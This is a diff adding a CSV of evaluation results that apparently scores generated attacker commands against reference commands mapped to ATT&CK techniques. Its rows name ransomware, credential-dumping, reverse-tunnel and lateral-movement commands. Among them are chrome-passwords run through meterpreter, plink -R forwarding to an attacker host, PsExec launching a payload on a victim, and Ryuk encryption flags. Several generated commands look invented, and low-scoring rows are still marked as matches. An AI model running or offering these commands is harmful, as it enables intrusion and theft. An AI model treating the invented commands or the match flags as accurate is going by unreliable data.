@@ -1,0 +1,25 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplConnectionFailures,`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,21.431,True
+command_adfind_TA0002_T1204.txt,adfind,"adfind msDS-ReplLinkFailures -f ""msPKIRoamingTimeStamp:<timestamp>""",`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,13.026,True
+command_adfind_TA0002_T1204.txt,adfind,adfind msDS-ReplPendingOps -c 10 -s,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,18.571,True
+command_adfind_TA0002_T1204.txt,adfind,"adfind msDS-ReplQueueStatistics -f ""msDS-Site-Affinity:<site_name>""",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,15.236,True
+command_adfind_TA0002_T1204.txt,adfind,"adfind msDS-RetiredReplNCSignatures -f ""msPKIRoamingTimeStamp:<timestamp>""",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,13.467,True
+command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|!(name=*Domain Group))"" -a dn","adfind -f ""(objectcategory=group)""`",45.681,True
+command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|(msDS-GroupType=3)(!msDS-GroupType=2))"" -a trustParent","adfind -f ""(objectcategory=group)""`",33.84,True
+command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=computer)(|!(name=*Domain Computer))"" -a trustChild",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,42.844,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",64.495,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Cookies.db,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",25.753,True
+command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Login Data.sqlitedb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",23.535,True
+command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Local Storage.sqlitedb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",23.223,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout,`plink.exe <domain_admin>@<bankfileserver_ip>`,28.645,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -no-antispoof,`plink.exe <domain_admin>@<bankfileserver_ip>`,32.281,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",48.477,True
+command_plink_TA0011_T1071.txt,plink,plink.exe -R <local_port>:localhost:<local_port>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",36.003,True
+command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u <username> -p <password> -d cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",21.939,True
+command_ryuk_TA0005_T1497.txt,ryuk,ryuk --check-sandbox <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,13.565,True
+command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --check-sandbox,`ryuk.exe --encrypt --process-name notepad.exe`,36.171,True
+command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --sandbox-evasion <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,27.668,True
+command_wmic_TA0007_T1082.txt,wmic,wmic os get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`",14.492,True
+command_wmic_TA0007_T1082.txt,wmic,"wmic path win32_videodescriptor get vidmode, width, height /value","`wmic /node:#{""POS system""} process call create #{""executable""}`",12.166,True
